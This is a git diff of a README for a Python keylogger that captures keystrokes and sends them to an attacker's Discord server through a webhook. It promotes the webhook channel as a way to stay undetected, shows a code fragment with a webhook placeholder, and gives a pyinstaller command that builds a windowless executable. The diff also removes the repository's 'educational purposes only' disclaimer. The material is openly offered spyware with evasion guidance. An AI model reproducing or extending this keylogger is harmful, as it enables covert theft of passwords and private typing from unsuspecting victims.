@@ -1,6 +1,6 @@
 # Keylogger That Reports To Discord #
 
-This python script will capture all of the keystrokes within a given time frame and report them to a Discord Server using Webhooks. Instead of the traditional "save to file" or "report to email" methods, you can use this method to stay undetected since webhook requests are considered as normal Discord Traffic.
+This super simle keylogger will capture all of the keystrokes within a given time frame and report them to a Discord Server using Webhooks. Instead of the traditional "save to file" or "report to email" methods, you can use this method to stay undetected since webhook requests are considered as normal Discord Traffic.
 
 ![image](https://i.ibb.co/LrkQPc3/keylogger.png)
 
@@ -19,17 +19,9 @@ Or you can download the [zip file](https://github.com/NoAssosciation/discord-key
 python -m pip install -r requirements.txt
 ```
 
-## Create a Discord Server 
-
-You can follow [this](https://support.discord.com/hc/en-us/articles/204849977-How-do-I-create-a-server-) article on how to do that.
-
-## Create a Discord Webhook
-
-Got to your servers settings select Intergrations >> Webhooks and create a new Webhook. You can also customize it and give it a name and a featured icon. Make sure to copy the URL, you will need it later.
-
 
 ## Edit keylogger.py
-Its time to edit the python script. Now that you have the Webhook URL, you can add that to the file. Also make sure to add your desired timeframe that they keylogger will report to you. You have to add the time in seconds so you can use [this](https://www.calculatorsoup.com/calculators/conversions/time.php) converter to get the correct time in seconds.
+Edit the script. Now that you have the Webhook URL, you can add that to the file. Also make sure to add your desired timeframe that they keylogger will report to you. You have to add the time in seconds so you can use [this](https://www.calculatorsoup.com/calculators/conversions/time.php) converter to get the correct time in seconds.
 
 ```Python
 import keyboard,os
@@ -43,8 +35,6 @@ WEBHOOK = "WEBHOOK_URL_HERE"
 
 ## Execute the script
 
-You are now ready to test the script and see whether if it works or not. If you are having problems with the script please open a new ticket on the issues tab and i will try to help you.
-
 To execute the script all you have to do is run:
 ```
 python keylogger.py
@@ -57,6 +47,4 @@ Now what if you want to turn this into an executable? You can do that with the p
 ```
 pyinstaller PATH_TO_SCRIPT --onefile --noconsole
 ```
-## ⚠️ DISCLAIMER ⚠️
 
-**I am not responsible for any of your actions. This GitHub repository is made for educational purposes only!!!**
